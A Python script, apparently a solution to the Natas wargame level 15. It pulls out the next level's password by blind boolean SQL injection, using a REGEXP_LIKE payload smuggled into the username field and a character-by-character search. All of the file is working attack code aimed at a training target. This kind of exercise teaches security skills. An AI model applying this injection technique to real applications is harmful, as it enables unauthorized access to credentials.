import string
import Auther

password = ""


def predicate(prefix: str, nextChar: str):
    # LIKE "...%" COLLATE utf8mb4_0900_as_cs
    data = {
        'username': f'natas16" AND REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c") AND "" LIKE "'}
    try:
        with Auther.request(15, data=data) as r:
            return "This user exists" in r.text
    except:
        return predicate(prefix, nextChar)


while len(password) < 32:  # 32-character password
    print(f"Progress: {password.ljust(32, '*')} -> ", end="")
    chosen_chaset = string.ascii_letters
    if predicate(password, '[[:alpha:]]'):
        chosen_chaset = string.ascii_uppercase if predicate(
            password, '[[:upper:]]') else string.ascii_lowercase
    else:
        chosen_chaset = string.digits
    best = None
    for char in chosen_chaset:
        if predicate(password, char):
            best = char
            break
    if best is None:
        print("Error")
        continue
    password += char
    print(password)

Auther.updateAuth(16, password)
